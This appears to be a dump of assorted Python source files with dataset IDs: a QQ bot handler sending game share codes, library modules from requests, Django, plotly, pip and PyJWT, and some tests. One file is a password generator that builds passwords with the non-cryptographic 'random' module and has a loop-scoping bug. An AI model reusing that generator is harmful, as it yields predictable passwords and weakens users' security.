5BF05372BD40DAAC9E9C614856374757 
业海嫖码: 
D1258C03AABF88C710D1D62AFA513C1D 
勇敢牛队白嫖码： 
31A40436E03D869E3A19A9C415D35B1C 
鱼鱼队白嫖码： 
0157A6FE080E14D0606B7721615FE7A7 
笨蛋龙白嫖码： 
01119190970EFC07C028146FCAF7A682 
定天鬼队白嫖码： 
B4AA2CAE12D48E3B95FC0E3AD15C55D1 
莽夫队白嫖码：(更新中) 
E34591E1873AAF298999A112E9DD4F68 
天蝉队白嫖码: 
F29170059077262738A0AB8E1665D932 
虫虫队白嫖码： 
6258A32D8B904B9E4E813B385A9985A3 
真蝎队白嫖码： 
17E5BE35894C3764BB26BFB3871A2AB5 
贵物队白嫖码： 
旧码(有天王基础会联防用):FBADCBD67510DA00BCD331D9C3EBEEA2 
新码(无基础萌新用):13F5D25C84FB11CF9095455422B388C9'''

    if 'group' in session_id:
        tmpList = session_id.split('_')
        groupNum = tmpList[1]

        # whiteablum
        whiteablum = ['860189236', '210839336']
        if groupNum not in whiteablum:
            await king.finish()

        await bot.call_api('send_group_msg', **{
            'group_id':int(groupNum),
            'message': '[CQ:at,qq='+user_id+']'+msg
        })
    else:
        await bot.call_api('send_private_msg', 
        **{'user_id':int(user_id), 'message': msg})

    await king.finish()

"
JY240	JY240-compat.py	"# -*- coding: utf-8 -*-

""""""
requests.compat
~~~~~~~~~~~~~~~

This module handles import compatibility issues between Python 2 and
Python 3.
""""""

try:
    import chardet
except ImportError:
    import viktor._vendor.charset_normalizer as chardet

import sys

# -------
# Pythons
# -------

# Syntax sugar.
_ver = sys.version_info

#: Python 2.x?
is_py2 = (_ver[0] == 2)

#: Python 3.x?
is_py3 = (_ver[0] == 3)

try:
    import simplejson as json
except ImportError:
    import json

# ---------
# Specifics
# ---------

if is_py2:
    from urllib import (
        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,
        proxy_bypass, proxy_bypass_environment, getproxies_environment)
    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag
    from urllib2 import parse_http_list
    import cookielib
    from Cookie import Morsel
    from StringIO import StringIO
    # Keep OrderedDict for backwards compatibility.
    from collections import Callable, Mapping, MutableMapping, OrderedDict


    builtin_str = str
    bytes = str
    str = unicode
    basestring = basestring
    numeric_types = (int, long, float)
    integer_types = (int, long)

elif is_py3:
    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag
    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment
    from http import cookiejar as cookielib
    from http.cookies import Morsel
    from io import StringIO
    # Keep OrderedDict for backwards compatibility.
    from collections import OrderedDict
    from collections.abc import Callable, Mapping, MutableMapping

    builtin_str = str
    str = str
    bytes = bytes
    basestring = (str, bytes)
    numeric_types = (int, float)
    integer_types = (int,)"
JY94	JY94-_wrap.py	"import re
from typing import Iterable, List, Tuple

from .cells import cell_len, chop_cells
from ._loop import loop_last

re_word = re.compile(r""\s*\S+\s*"")


def words(text: str) -> Iterable[Tuple[int, int, str]]:
    position = 0
    word_match = re_word.match(text, position)
    while word_match is not None:
        start, end = word_match.span()
        word = word_match.group(0)
        yield start, end, word
        word_match = re_word.match(text, end)


def divide_line(text: str, width: int, fold: bool = True) -> List[int]:
    divides: List[int] = []
    append = divides.append
    line_position = 0
    _cell_len = cell_len
    for start, _end, word in words(text):
        word_length = _cell_len(word.rstrip())
        if line_position + word_length > width:
            if word_length > width:
                if fold:
                    for last, line in loop_last(
                        chop_cells(word, width, position=line_position)
                    ):
                        if last:
                            line_position = _cell_len(line)
                        else:
                            start += len(line)
                            append(start)
                else:
                    if start:
                        append(start)
                    line_position = _cell_len(word)
            elif line_position and start:
                append(start)
                line_position = _cell_len(word)
        else:
            line_position += _cell_len(word)
    return divides


if __name__ == ""__main__"":  # pragma: no cover
    from .console import Console

    console = Console(width=10)
    console.print(""12345 abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ 12345"")
    print(chop_cells(""abcdefghijklmnopqrstuvwxyz"", 10, position=2))"
JY361	JY361-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""histogram2dcontour.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY129	JY129-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class SpatialiteGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' table from SpatiaLite.
    """"""

    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    spatial_index_enabled = models.IntegerField()
    type = models.IntegerField(db_column=""geometry_type"")

    class Meta:
        app_label = ""gis""
        db_table = ""geometry_columns""
        managed = False

    def __str__(self):
        return ""%s.%s - %dD %s field (SRID: %d)"" % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return ""f_table_name""

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return ""f_geometry_column""


class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from SpatiaLite.
    """"""

    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    ref_sys_name = models.CharField(max_length=256)
    proj4text = models.CharField(max_length=2048)
    srtext = models.CharField(max_length=2048)

    class Meta:
        app_label = ""gis""
        db_table = ""spatial_ref_sys""
        managed = False

    @property
    def wkt(self):
        return self.srtext"
JY545	JY545-models.py	"from django.db import models
from django.contrib.auth.models import User
from io import BytesIO
import sys
print(sys.path)
from PIL import Image
from django.core.files.uploadedfile import InMemoryUploadedFile


# Create your models here.

class Blog_Post(models.Model, object):
    image = models.ImageField(blank= True, upload_to='get_upload_file_name')
    title = models.CharField(blank=True, max_length = 100)
    summary = models.TextField(blank= True, max_length =30)
    body = models.TextField(blank=True)
    slug = models.SlugField( unique=True)
    writer = models.ForeignKey(User,on_delete= models.CASCADE)
    created_on = models.DateTimeField(auto_now_add=True)

    def __str__(self) -> str:
        return self.title
    def save(self):
        # Opening the uploaded image
        im = Image.open(self.image)

        output = BytesIO()

        # Resize/modify the image
        im = im.resize((1024, 720))

        # after modifications, save it to the output
        im.save(output, format='png', quality=300)
        output.seek(0)

        # change the imagefield value to be the newley modifed image value
        self.image = InMemoryUploadedFile(output, 'ImageField', ""%s.webp"" % self.image.name.split('.')[0], 'image/webp',
                                        sys.getsizeof(output), None)

        super(Blog_Post, self).save()

class Comment(models.Model):
        commenter = models.CharField(max_length=15)
        body = models.TextField(max_length=30, blank=True)
        post = models.ForeignKey(Blog_Post, on_delete=models.CASCADE, related_name='comments')
        date = models.DateField(auto_now_add=True)
        like = models.BooleanField(default=True)
        def __str__(self) -> str:
             return self.commenter



class Meta:
    ordering = ('-created_at',)

   "
JD371	JD371-encodingTools.py	"""""""fontTools.misc.encodingTools.py -- tools for working with OpenType encodings.
""""""

import fontTools.encodings.codecs

# Map keyed by platformID, then platEncID, then possibly langID
_encodingMap = {
    0: {  # Unicode
        0: ""utf_16_be"",
        1: ""utf_16_be"",
        2: ""utf_16_be"",
        3: ""utf_16_be"",
        4: ""utf_16_be"",
        5: ""utf_16_be"",
        6: ""utf_16_be"",
    },
    1: {  # Macintosh
        # See
        # https://github.com/fonttools/fonttools/issues/236
        0: {  # Macintosh, platEncID==0, keyed by langID
            15: ""mac_iceland"",
            17: ""mac_turkish"",
            18: ""mac_croatian"",
            24: ""mac_latin2"",
            25: ""mac_latin2"",
            26: ""mac_latin2"",
            27: ""mac_latin2"",
            28: ""mac_latin2"",
            36: ""mac_latin2"",
            37: ""mac_romanian"",
            38: ""mac_latin2"",
            39: ""mac_latin2"",
            40: ""mac_latin2"",
            Ellipsis: ""mac_roman"",  # Other
        },
        1: ""x_mac_japanese_ttx"",
        2: ""x_mac_trad_chinese_ttx"",
        3: ""x_mac_korean_ttx"",
        6: ""mac_greek"",
        7: ""mac_cyrillic"",
        25: ""x_mac_simp_chinese_ttx"",
        29: ""mac_latin2"",
        35: ""mac_turkish"",
        37: ""mac_iceland"",
    },
    2: {  # ISO
        0: ""ascii"",
        1: ""utf_16_be"",
        2: ""latin1"",
    },
    3: {  # Microsoft
        0: ""utf_16_be"",
        1: ""utf_16_be"",
        2: ""shift_jis"",
        3: ""gb2312"",
        4: ""big5"",
        5: ""euc_kr"",
        6: ""johab"",
        10: ""utf_16_be"",
    },
}


def getEncoding(platformID, platEncID, langID, default=None):
    """"""Returns the Python encoding name for OpenType platformID/encodingID/langID
    triplet.  If encoding for these values is not known, by default None is
    returned.  That can be overriden by passing a value to the default argument.
    """"""
    encoding = _encodingMap.get(platformID, {}).get(platEncID, default)
    if isinstance(encoding, dict):
        encoding = encoding.get(langID, encoding[Ellipsis])
    return encoding"
JY23	JY23-log.py	"""""""A simple log mechanism styled after PEP 282.""""""

# The class here is styled after PEP 282 so that it could later be
# replaced with a standard Python logging implementation.

DEBUG = 1
INFO = 2
WARN = 3
ERROR = 4
FATAL = 5

import sys

class Log:

    def __init__(self, threshold=WARN):
        self.threshold = threshold

    def _log(self, level, msg, args):
        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):
            raise ValueError('%s wrong log level' % str(level))

        if level >= self.threshold:
            if args:
                msg = msg % args
            if level in (WARN, ERROR, FATAL):
                stream = sys.stderr
            else:
                stream = sys.stdout
            try:
                stream.write('%s\n' % msg)
            except UnicodeEncodeError:
                # emulate backslashreplace error handler
                encoding = stream.encoding
                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)
                stream.write('%s\n' % msg)
            stream.flush()

    def log(self, level, msg, *args):
        self._log(level, msg, args)

    def debug(self, msg, *args):
        self._log(DEBUG, msg, args)

    def info(self, msg, *args):
        self._log(INFO, msg, args)

    def warn(self, msg, *args):
        self._log(WARN, msg, args)

    def error(self, msg, *args):
        self._log(ERROR, msg, args)

    def fatal(self, msg, *args):
        self._log(FATAL, msg, args)

_global_log = Log()
log = _global_log.log
debug = _global_log.debug
info = _global_log.info
warn = _global_log.warn
error = _global_log.error
fatal = _global_log.fatal

def set_threshold(level):
    # return the old threshold for use from tests
    old = _global_log.threshold
    _global_log.threshold = level
    return old

def set_verbosity(v):
    if v <= 0:
        set_threshold(WARN)
    elif v == 1:
        set_threshold(INFO)
    elif v >= 2:
        set_threshold(DEBUG)"
JD459	JD459-_callers.py	"""""""
Call loop machinery
""""""
import sys

from ._result import HookCallError, _Result, _raise_wrapfail


def _multicall(hook_name, hook_impls, caller_kwargs, firstresult):
    """"""Execute a call into multiple python functions/methods and return the
    result(s).

    ``caller_kwargs`` comes from _HookCaller.__call__().
    """"""
    __tracebackhide__ = True
    results = []
    excinfo = None
    try:  # run impl and wrapper setup functions in a loop
        teardowns = []
        try:
            for hook_impl in reversed(hook_impls):
                try:
                    args = [caller_kwargs[argname] for argname in hook_impl.argnames]
                except KeyError:
                    for argname in hook_impl.argnames:
                        if argname not in caller_kwargs:
                            raise HookCallError(
                                f""hook call must provide argument {argname!r}""
                            )

                if hook_impl.hookwrapper:
                    try:
                        gen = hook_impl.function(*args)
                        next(gen)  # first yield
                        teardowns.append(gen)
                    except StopIteration:
                        _raise_wrapfail(gen, ""did not yield"")
                else:
                    res = hook_impl.function(*args)
                    if res is not None:
                        results.append(res)
                        if firstresult:  # halt further impl calls
                            break
        except BaseException:
            excinfo = sys.exc_info()
    finally:
        if firstresult:  # first result hooks return a single value
            outcome = _Result(results[0] if results else None, excinfo)
        else:
            outcome = _Result(results, excinfo)

        # run all wrapper post-yield blocks
        for gen in reversed(teardowns):
            try:
                gen.send(outcome)
                _raise_wrapfail(gen, ""has second yield"")
            except StopIteration:
                pass

        return outcome.get_result()"
JD137	JD137-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scattersmith.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD209	JD209-backend.py	"import random
import array

class Backend():
    def __init__(self):
        self.DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
        self.LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        self.UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
        self.SYMBOLS = ['!', '@', '#', '$', '%', '^', '&', ';', ',', '>', '}', '{', '[', ']', '=', ':', '?', '.', '/', '|', '~', '>', '*', '(', ')', '<', '`', '+', '-', '_']
    
    def generate_password(self, length: int, locase: bool, upcase: bool, symbols: bool) -> str:
        COMBINED_LIST = self.DIGITS
        rand_digit = random.choice(self.DIGITS)
        temp_pass = rand_digit
        temp_pass_len = 1

        if locase == True:
            rand_locase = random.choice(self.LOCASE_CHARACTERS)
            temp_pass = temp_pass + rand_locase
            temp_pass_len += 1
            COMBINED_LIST = COMBINED_LIST + self.LOCASE_CHARACTERS

        if upcase == True:
            rand_upcase = random.choice(self.UPCASE_CHARACTERS)
            temp_pass = temp_pass + rand_upcase
            temp_pass_len += 1
            COMBINED_LIST = COMBINED_LIST + self.UPCASE_CHARACTERS

        if symbols == True:
            rand_symbol = random.choice(self.SYMBOLS)
            temp_pass = temp_pass + rand_symbol
            temp_pass_len += 1
            COMBINED_LIST = COMBINED_LIST + self.SYMBOLS

        for x in range(length - temp_pass_len):
            temp_pass = temp_pass + random.choice(COMBINED_LIST)

            temp_pass_list = array.array('u', temp_pass)
            random.shuffle(temp_pass_list)

        password = """"
        for x in temp_pass_list:
                password = password + x

        return password"
JD72	JD72-cache.py	"""""""HTTP cache implementation.
""""""

import os
from contextlib import contextmanager
from typing import Iterator, Optional

from pip._vendor.cachecontrol.cache import BaseCache
from pip._vendor.cachecontrol.caches import FileCache
from pip._vendor.requests.models import Response

from pip._internal.utils.filesystem import adjacent_tmp_file, replace
from pip._internal.utils.misc import ensure_dir


def is_from_cache(response: Response) -> bool:
    return getattr(response, ""from_cache"", False)


@contextmanager
def suppressed_cache_errors() -> Iterator[None]:
    """"""If we can't access the cache then we can just skip caching and process
    requests as if caching wasn't enabled.
    """"""
    try:
        yield
    except OSError:
        pass


class SafeFileCache(BaseCache):
    """"""
    A file based cache which is safe to use even when the target directory may
    not be accessible or writable.
    """"""

    def __init__(self, directory: str) -> None:
        assert directory is not None, ""Cache directory must not be None.""
        super().__init__()
        self.directory = directory

    def _get_cache_path(self, name: str) -> str:
        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our
        # class for backwards-compatibility and to avoid using a non-public
        # method.
        hashed = FileCache.encode(name)
        parts = list(hashed[:5]) + [hashed]
        return os.path.join(self.directory, *parts)

    def get(self, key: str) -> Optional[bytes]:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            with open(path, ""rb"") as f:
                return f.read()

    def set(self, key: str, value: bytes, expires: Optional[int] = None) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            ensure_dir(os.path.dirname(path))

            with adjacent_tmp_file(path) as f:
                f.write(value)

            replace(f.name, path)

    def delete(self, key: str) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            os.remove(path)"
JY447	JY447-api_jwk.py	"import json

from .algorithms import get_default_algorithms
from .exceptions import PyJWKError, PyJWKSetError


class PyJWK:
    def __init__(self, jwk_data, algorithm=None):
        self._algorithms = get_default_algorithms()
        self._jwk_data = jwk_data

        if not algorithm and isinstance(self._jwk_data, dict):
            algorithm = self._jwk_data.get(""alg"", None)

        if not algorithm:
            raise PyJWKError(""Unable to find a algorithm for key: %s"" % self._jwk_data)

        self.Algorithm = self._algorithms.get(algorithm)

        if not self.Algorithm:
            raise PyJWKError(""Unable to find a algorithm for key: %s"" % self._jwk_data)

        self.key = self.Algorithm.from_jwk(self._jwk_data)

    @staticmethod
    def from_dict(obj, algorithm=None):
        return PyJWK(obj, algorithm)

    @staticmethod
    def from_json(data, algorithm=None):
        obj = json.loads(data)
        return PyJWK.from_dict(obj, algorithm)

    @property
    def key_type(self):
        return self._jwk_data.get(""kty"", None)

    @property
    def key_id(self):
        return self._jwk_data.get(""kid"", None)

    @property
    def public_key_use(self):
        return self._jwk_data.get(""use"", None)


class PyJWKSet:
    def __init__(self, keys):
        self.keys = []

        if not keys or not isinstance(keys, list):
            raise PyJWKSetError(""Invalid JWK Set value"")

        if len(keys) == 0:
            raise PyJWKSetError(""The JWK Set did not contain any keys"")

        for key in keys:
            self.keys.append(PyJWK(key))

    @staticmethod
    def from_dict(obj):
        keys = obj.get(""keys"", [])
        return PyJWKSet(keys)

    @staticmethod
    def from_json(data):
        obj = json.loads(data)
        return PyJWKSet.from_dict(obj)"
JY95	JY95-before_sleep.py	"# Copyright 2016 Julien Danjou
# Copyright 2016 Joshua Harlow
# Copyright 2013-2014 Ray Holder
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import typing

from pip._vendor.tenacity import _utils

if typing.TYPE_CHECKING:
    import logging

    from pip._vendor.tenacity import RetryCallState


def before_sleep_nothing(retry_state: ""RetryCallState"") -> None:
    """"""Before call strategy that does nothing.""""""


def before_sleep_log(
    logger: ""logging.Logger"",
    log_level: int,
    exc_info: bool = False,
) -> typing.Callable[[""RetryCallState""], None]:
    """"""Before call strategy that logs to some logger the attempt.""""""

    def log_it(retry_state: ""RetryCallState"") -> None:
        if retry_state.outcome.failed:
            ex = retry_state.outcome.exception()
            verb, value = ""raised"", f""{ex.__class__.__name__}: {ex}""

            if exc_info:
                local_exc_info = retry_state.outcome.exception()
            else:
                local_exc_info = False
        else:
            verb, value = ""returned"", retry_state.outcome.result()
            local_exc_info = False  # exc_info does not apply when no exception

        logger.log(
            log_level,
            f""Retrying {_utils.get_callback_name(retry_state.fn)} ""
            f""in {retry_state.next_action.sleep} seconds as it {verb} {value}."",
            exc_info=local_exc_info,
        )

    return log_it"
JY107	JY107-loader.py	"from . import engines
from .exceptions import TemplateDoesNotExist


def get_template(template_name, using=None):
    """"""
    Load and return a template for the given name.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    chain = []
    engines = _engine_list(using)
    for engine in engines:
        try:
            return engine.get_template(template_name)
        except TemplateDoesNotExist as e:
            chain.append(e)

    raise TemplateDoesNotExist(template_name, chain=chain)


def select_template(template_name_list, using=None):
    """"""
    Load and return a template for one of the given names.

    Try names in order and return the first template found.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    if isinstance(template_name_list, str):
        raise TypeError(
            ""select_template() takes an iterable of template names but got a ""
            ""string: %r. Use get_template() if you want to load a single ""
            ""template by name."" % template_name_list
        )

    chain = []
    engines = _engine_list(using)
    for template_name in template_name_list:
        for engine in engines:
            try:
                return engine.get_template(template_name)
            except TemplateDoesNotExist as e:
                chain.append(e)

    if template_name_list:
        raise TemplateDoesNotExist("", "".join(template_name_list), chain=chain)
    else:
        raise TemplateDoesNotExist(""No template names provided"")


def render_to_string(template_name, context=None, request=None, using=None):
    """"""
    Load a template and render it with a context. Return a string.

    template_name may be a string or a list of strings.
    """"""
    if isinstance(template_name, (list, tuple)):
        template = select_template(template_name, using=using)
    else:
        template = get_template(template_name, using=using)
    return template.render(context, request)


def _engine_list(using=None):
    return engines.all() if using is None else [engines[using]]"
JD20	JD20-test_return_logical.py	"import pytest

from numpy import array
from . import util


class TestReturnLogical(util.F2PyTest):
    def check_function(self, t):
        assert t(True) == 1
        assert t(False) == 0
        assert t(0) == 0
        assert t(None) == 0
        assert t(0.0) == 0
        assert t(0j) == 0
        assert t(1j) == 1
        assert t(234) == 1
        assert t(234.6) == 1
        assert t(234.6 + 3j) == 1
        assert t(""234"") == 1
        assert t(""aaa"") == 1
        assert t("""") == 0
        assert t([]) == 0
        assert t(()) == 0
        assert t({}) == 0
        assert t(t) == 1
        assert t(-234) == 1
        assert t(10**100) == 1
        assert t([234]) == 1
        assert t((234, )) == 1
        assert t(array(234)) == 1
        assert t(array([234])) == 1
        assert t(array([[234]])) == 1
        assert t(array([127], ""b"")) == 1
        assert t(array([234], ""h"")) == 1
        assert t(array([234], ""i"")) == 1
        assert t(array([234], ""l"")) == 1
        assert t(array([234], ""f"")) == 1
        assert t(array([234], ""d"")) == 1
        assert t(array([234 + 3j], ""F"")) == 1
        assert t(array([234], ""D"")) == 1
        assert t(array(0)) == 0
        assert t(array([0])) == 0
        assert t(array([[0]])) == 0
        assert t(array([0j])) == 0
        assert t(array([1])) == 1
        pytest.raises(ValueError, t, array([0, 0]))


class TestFReturnLogical(TestReturnLogical):
    sources = [
        util.getpath(""tests"", ""src"", ""return_logical"", ""foo77.f""),
        util.getpath(""tests"", ""src"", ""return_logical"", ""foo90.f90""),
    ]

    @pytest.mark.slow
    @pytest.mark.parametrize(""name"", ""t0,t1,t2,t4,s0,s1,s2,s4"".split("",""))
    def test_all_f77(self, name):
        self.check_function(getattr(self.module, name))

    @pytest.mark.slow
    @pytest.mark.parametrize(""name"",
                             ""t0,t1,t2,t4,t8,s0,s1,s2,s4,s8"".split("",""))
    def test_all_f90(self, name):
        self.check_function(getattr(self.module.f90_return_logical, name))"
JY326	JY326-task_02.py	"""""""
task_02.py

Возьмите 1-3 любые задачи из прошлых семинаров (например сериализация данных),
которые вы уже решали. Превратите функции в методы класса, а параметры
в свойства. Задачи должны решаться через вызов методов экземпляра.
""""""
import os
from pathlib import Path
from serialization import base_serialization as bs


def show_comparison(message_: str, result_: bool):
    if result_:
        print(f""{message_} equal."")
    else:
        print(f""{message_} not equal."")


if __name__ == '__main__':
    # получаем текущий рабочий каталог
    work_path = os.getcwd()

    ps = bs.Serialization()
    # рекурсивно обходим директорию и сохраняем результат в переменной
    res_list = ps.dir2list(work_path)

    # сохраняем переменную в файлах формата json, csv, pickle
    ps.save2json(res_list, Path('file_in.json'))
    ps.save2csv(res_list, Path('file_in.csv'))
    ps.save2pickle(res_list, Path('file_in.pickle'))

    # загружаем поочерёдно содержимое файлов в тестовую
    # переменную res_ и сравниваем её с исходной переменной res_list
    pickle_list = ps.load4pickle(Path('file_in.pickle'))
    res_ = ps.list_comparison(pickle_list, res_list)
    show_comparison(""Lists res_list and pickle_list are"", res_)

    csv_list = ps.load4csv(Path('file_in.csv'))
    res_ = ps.list_comparison(csv_list, res_list)
    show_comparison(""Lists res_list and csv_list are"", res_)

    json_list = ps.load4json(Path('file_in.json'))
    res_ = ps.list_comparison(json_list, res_list)
    show_comparison(""Lists res_list and json_list are"", res_)"
JY168	JY168-qt_exporter.py	"import os
import sys
import tempfile

from traitlets import default

from .html import HTMLExporter


class QtExporter(HTMLExporter):

    paginate = None

    @default(""file_extension"")
    def _file_extension_default(self):
        return "".html""

    def _check_launch_reqs(self):
        if sys.platform.startswith(""win"") and self.format == ""png"":
            raise RuntimeError(""Exporting to PNG using Qt is currently not supported on Windows."")
        from .qt_screenshot import QT_INSTALLED

        if not QT_INSTALLED:
            raise RuntimeError(
                f""PyQtWebEngine is not installed to support Qt {self.format.upper()} conversion. ""
                f""Please install `nbconvert[qt{self.format}]` to enable.""
            )
        from .qt_screenshot import QtScreenshot

        return QtScreenshot

    def _run_pyqtwebengine(self, html):
        ext = "".html""
        temp_file = tempfile.NamedTemporaryFile(suffix=ext, delete=False)
        filename = f""{temp_file.name[:-len(ext)]}.{self.format}""
        with temp_file:
            temp_file.write(html.encode(""utf-8""))
        try:
            QtScreenshot = self._check_launch_reqs()
            s = QtScreenshot()
            s.capture(f""file://{temp_file.name}"", filename, self.paginate)
        finally:
            # Ensure the file is deleted even if pyqtwebengine raises an exception
            os.unlink(temp_file.name)
        return s.data

    def from_notebook_node(self, nb, resources=None, **kw):
        self._check_launch_reqs()
        html, resources = super().from_notebook_node(nb, resources=resources, **kw)

        self.log.info(f""Building {self.format.upper()}"")
        data = self._run_pyqtwebengine(html)
        self.log.info(f""{self.format.upper()} successfully created"")

        # convert output extension
        # the writer above required it to be html
        resources[""output_extension""] = f"".{self.format}""

        return data, resources"
JD477	JD477-test_exceptions.py	"# coding: utf-8
from __future__ import unicode_literals

import pytest


@pytest.mark.parametrize(""text"", [""ca."", ""m.a.o."", ""Jan."", ""Dec."", ""kr."", ""jf.""])
def test_da_tokenizer_handles_abbr(da_tokenizer, text):
    tokens = da_tokenizer(text)
    assert len(tokens) == 1


@pytest.mark.parametrize(""text"", [""Jul."", ""jul."", ""Tor."", ""Tors.""])
def test_da_tokenizer_handles_ambiguous_abbr(da_tokenizer, text):
    tokens = da_tokenizer(text)
    assert len(tokens) == 2


@pytest.mark.parametrize(""text"", [""1."", ""10."", ""31.""])
def test_da_tokenizer_handles_dates(da_tokenizer, text):
    tokens = da_tokenizer(text)
    assert len(tokens) == 1


def test_da_tokenizer_handles_exc_in_text(da_tokenizer):
    text = ""Det er bl.a. ikke meningen""
    tokens = da_tokenizer(text)
    assert len(tokens) == 5
    assert tokens[2].text == ""bl.a.""


def test_da_tokenizer_handles_custom_base_exc(da_tokenizer):
    text = ""Her er noget du kan kigge i.""
    tokens = da_tokenizer(text)
    assert len(tokens) == 8
    assert tokens[6].text == ""i""
    assert tokens[7].text == "".""


@pytest.mark.parametrize(
    ""text,n_tokens"",
    [
        (""Godt og/eller skidt"", 3),
        (""Kør 4 km/t på vejen"", 5),
        (""Det blæser 12 m/s."", 5),
        (""Det blæser 12 m/sek. på havnen"", 6),
        (""Windows 8/Windows 10"", 5),
        (""Billeten virker til bus/tog/metro"", 8),
        (""26/02/2019"", 1),
        (""Kristiansen c/o Madsen"", 3),
        (""Sprogteknologi a/s"", 2),
        (""De boede i A/B Bellevue"", 5),
        # note: skipping due to weirdness in UD_Danish-DDT
        # (""Rotorhastigheden er 3400 o/m."", 5),
        (""Jeg købte billet t/r."", 5),
        (""Murerarbejdsmand m/k søges"", 3),
        (""Netværket kører over TCP/IP"", 4),
    ],
)
def test_da_tokenizer_slash(da_tokenizer, text, n_tokens):
    tokens = da_tokenizer(text)
    assert len(tokens) == n_tokens"
JD237	JD237-deconstruct.py	"from importlib import import_module

from django.utils.version import get_docs_version


def deconstructible(*args, path=None):
    """"""
    Class decorator that allows the decorated class to be serialized
    by the migrations subsystem.

    The `path` kwarg specifies the import path.
    """"""

    def decorator(klass):
        def __new__(cls, *args, **kwargs):
            # We capture the arguments to make returning them trivial
            obj = super(klass, cls).__new__(cls)
            obj._constructor_args = (args, kwargs)
            return obj

        def deconstruct(obj):
            """"""
            Return a 3-tuple of class import path, positional arguments,
            and keyword arguments.
            """"""
            # Fallback version
            if path and type(obj) is klass:
                module_name, _, name = path.rpartition(""."")
            else:
                module_name = obj.__module__
                name = obj.__class__.__name__
            # Make sure it's actually there and not an inner class
            module = import_module(module_name)
            if not hasattr(module, name):
                raise ValueError(
